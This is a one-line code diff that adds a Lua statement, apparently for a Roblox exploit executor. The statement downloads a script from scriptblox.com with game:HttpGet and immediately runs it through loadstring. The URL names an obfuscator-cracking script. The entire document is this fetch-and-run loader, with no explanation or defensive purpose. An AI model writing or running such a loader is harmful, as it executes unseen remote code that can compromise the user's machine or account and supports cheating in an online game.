@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Anti-Wearedevs-obfuscator-cracking-83618"))()
